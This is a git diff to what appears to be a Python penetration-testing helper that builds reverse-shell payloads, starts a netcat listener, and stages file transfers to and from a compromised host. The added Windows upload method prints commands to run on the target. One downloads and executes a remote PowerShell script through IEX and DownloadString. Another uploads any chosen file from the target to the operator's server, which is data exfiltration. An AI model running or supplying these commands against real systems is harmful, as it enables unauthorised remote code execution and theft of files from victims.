@@ -14,8 +14,9 @@ from getpass import getpass
 # TRANSFERTO AVAILABLE METHODS (NEED TO ADD SMB AND FTP)
 TransferTo_Methods = ['HTTP', 'SCP', 'Base64']
 
-# TRANFERFROM AVAILABLE METHODS (NEED TO ADD , 'UploadServer', 'SMB', 'FTP', 'WebDAV')
-TransferFrom_Methods = ['Base64']
+# TRANFERFROM AVAILABLE METHODS (NEED TO ADD 'SMB', 'FTP', 'WebDAV')
+TransferFrom_WinMethods = ['Base64', 'UploadServer']
+TransferFrom_NixMethods = ['Base64']
 
 # GENERATE CHOICES BASED ON A DYNAMIC LIST
 def dynamic_populated_choices(entrymsg, dynamic_list):
@@ -96,7 +97,6 @@ def create_payload(args):
         random_port = random.randint(1024, 49151)
         listen_port = str(random_port)
     print('[+] Using port ' + listen_port)
-
     print('[+] Creating payload ...')
     # CHECK PAYLOAD OS
     if args.shell == 'reverse':
@@ -117,14 +117,12 @@ def create_payload(args):
         if run_listener == '' or run_listener[0] == 'y':
             try:
                 print('[+] Listening on ' + listen_ip + ':' + listen_port + ' ...')
-                subprocess.run(['nc', '-nls', listen_ip,'-p', listen_port])
+                cmd = 'nc -nls ' + listen_ip + ' -p ' + listen_port
+                subprocess.run(cmd)
             except KeyboardInterrupt:
                 sys.exit(0)
         else:
             print('[-] No listener was started')
-
-
-
     elif args.shell == 'bind':
         print('[!] Not yet implemented')
     elif args.shell == 'web':
@@ -151,6 +149,7 @@ def transfer_to(args):
         print('[+] Starting HTTP server on ' + listen_ip + ':443 ...')
         try:
             pyserver = subprocess.Popen(['python', '-m', 'http.server', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            print('[+] HTTP server succesfully started')
         except KeyboardInterrupt:
             sys.exit(0)
         except:
@@ -226,10 +225,10 @@ def transfer_to(args):
 
         print('[?] Close HTTP server? [Y/n] ', end='')
         time.sleep(1)
-        pyterminate = input().lower()
-        if pyterminate == '':
-            pyterminate = 'y'
-        if pyterminate == 'n':
+        subterminate = input().lower()
+        if subterminate == '':
+            subterminate = 'y'
+        if subterminate == 'n':
             print('[!] HTTP server was left open')
         else:
             try:
@@ -293,6 +292,14 @@ def transfer_to(args):
         elif res.returncode == 255:
             print('[!] File could not be uploaded. Connection refused.')
 
+def get_absolute_path():
+    print('[?] What is the absolute path of the file on target: ', end='')
+    try:
+        file_absolute_path = input()
+        return file_absolute_path
+    except KeyboardInterrupt:
+        sys.exit(0)
+
 # TRANSFER FILES FROM
 def transfer_from(args):
     # SEPARATE RELATIVE PATH TO FILE FROM FILENAME ITSELF
@@ -302,25 +309,24 @@ def transfer_from(args):
     # GENERATE RANDOM FILENAME FOR EXTREMELY MINIMAL FILE OBFUSCATION
     rand_filename = ''.join(random.choices(string.ascii_letters, k=8))
 
-    # SELECT METHOD
     entrymsg = '[?] What method to use?'
-    method = dynamic_populated_choices(entrymsg, TransferFrom_Methods)
 
-    # TARGET FILE FULLPATH
-    print('[?] What is the fullpath of the file on target: ', end='')
-    try:
-        file_fullpath = input()
-    except KeyboardInterrupt:
-        sys.exit(0)
+    ###########################
+    ### FROM WINDOWS TARGET ###
+    ###########################
+    if args.os == 'windows':
+        # METHOD SELECTION
+        method = dynamic_populated_choices(entrymsg, TransferFrom_WinMethods)
 
-    # BASE64 METHOD
-    if method == 'base64':
-        # file_fullpath = 'C:\Windows\system32\drivers\etc\hosts'
-        if args.os == 'windows':
-            filename = file_fullpath.split('\\')[-1]
+        #############################
+        ### WINDOWS BASE64 METHOD ###
+        #############################
+        if method == 'base64':
+            file_absolute_path = get_absolute_path()
+            filename = file_absolute_path.split('\\')[-1]
             while True:
-                finalcmd = '[Convert]::ToBase64String((Get-Content -path \"' + file_fullpath + '\" -Encoding byte))'
-                finalcmd2 = 'Get-FileHash ' + file_fullpath + ' -Algorithm md5'
+                finalcmd = '[Convert]::ToBase64String((Get-Content -path \"' + file_absolute_path + '\" -Encoding byte))'
+                finalcmd2 = 'Get-FileHash ' + file_absolute_path + ' -Algorithm md5'
                 print('\n[================== RUN ON TARGET ==================]\n')
                 print('# GENERATE BASE64 STRING')
                 print(finalcmd)
@@ -343,12 +349,63 @@ def transfer_from(args):
                     cmd = 'rm ' + filename
                     subprocess.run(cmd, shell=True)
                     print('[!] MD5 checksum does not match')
-                    input('[*] Press any key to try again ...')
+                    try:
+                        input('[*] Press any key to try again ...')
+                    except KeyboardInterrupt:
+                        sys.exit(0)
 
+        ###################################
+        ### WINDOWS UPLOADSERVER METHOD ###
+        ###################################
+        elif method == 'uploadserver':
+            # START UPLOADSERVER
+            listen_ip = listening_ip_address()
+            print('[+] Starting upload server on ' + listen_ip + ':443 ...')
+            try:
+                uploadserver = subprocess.Popen(['python3', '-m', 'uploadserver', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                print('[+] Upload server successfully started')
+            except KeyboardInterrupt:
+                sys.exit(0)
+            except:
+                print('[!] Failed to start upload server')
+                sys.exit(1)
 
-        # ON LINUX
-        elif args.os == 'linux':
-            print('[-] Still working on it')
+            # GET FILENAME AND ABSOLUTE PATH
+            file_absolute_path = get_absolute_path()
+            filename = file_absolute_path.split('\\')[-1]
+
+            # TARGET PASTABLES
+            finalcmd = 'IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1\')'
+            finalcmd2 = 'Invoke-FileUpload -Uri https://' + listen_ip + '/upload -File ' + file_absolute_path
+            print('\n[================== RUN ON TARGET ==================]\n')
+            print('# DOWNLOAD PSUPLOAD.PS1')
+            print(finalcmd)
+            print('\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER')
+            print(finalcmd2)
+            print('\n[================ END RUN ON TARGET ================]\n')
+
+            # TERMINATE UPLOAD SERVER WHEN DONE
+            print('[?] Close upload server? [Y/n] ', end='')
+            time.sleep(1)
+            subterminate = input().lower()
+            if subterminate == '':
+                subterminate = 'y'
+            if subterminate == 'n':
+                print('[!] HTTP server was left open')
+            else:
+                try:
+                    uploadserver.terminate()
+                    print('[+] Upload server succesfully terminated')
+                except:
+                    print('[!] Could not terminate upload server')
+
+    #########################
+    ### FROM LINUX TARGET ###
+    #########################
+    elif args.os == 'linux':
+        method = dynamic_populated_choices(entrymsg, TransferFrom_NixMethods)
+
+        #     print('[-] Still working on it')
             # b64_file = subprocess.run(['base64', '-w', '0', relpath], capture_output=True, text=True)
             # print('\n[===== START LINUX COMMAND =====]\n')
             # print('echo \'' + b64_file.stdout + '\' | base64 -d > ' + args.filename + ' && md5sum ' + args.filename)
